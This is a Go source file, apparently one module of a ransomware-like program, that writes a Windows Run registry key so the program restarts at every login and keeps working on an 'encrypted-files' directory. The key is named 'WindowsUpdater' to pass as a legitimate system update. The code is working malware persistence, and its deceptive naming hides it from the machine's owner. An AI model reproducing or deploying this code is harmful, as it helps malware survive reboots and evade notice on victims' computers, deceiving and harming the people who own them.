package persistance

import (
	"golang.org/x/sys/windows/registry"
	"log"
	"os"
)

func RegistryAutoRun() error {
	regPath := `Software\Microsoft\Windows\CurrentVersion\Run`

	log.Printf("Trying to add a value to the registry %s ...", regPath)

	k, err := registry.OpenKey(registry.CURRENT_USER, regPath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	path, _ := os.Getwd()

	command := `"C:\Windows\System32\cmd.exe" /c cd ` + path + ` && ` + os.Args[0] + ` run --dir ` + path + `\encrypted-files`

	err = k.SetStringValue(`WindowsUpdater`, command)
	if err != nil {
		return err
	}

	log.Println(`Success! Value added to the registry`)

	defer func(k registry.Key) {
		err := k.Close()
		if err != nil {
			log.Fatal(`Error. Can't close registry'`)
		}
	}(k)

	return nil
}
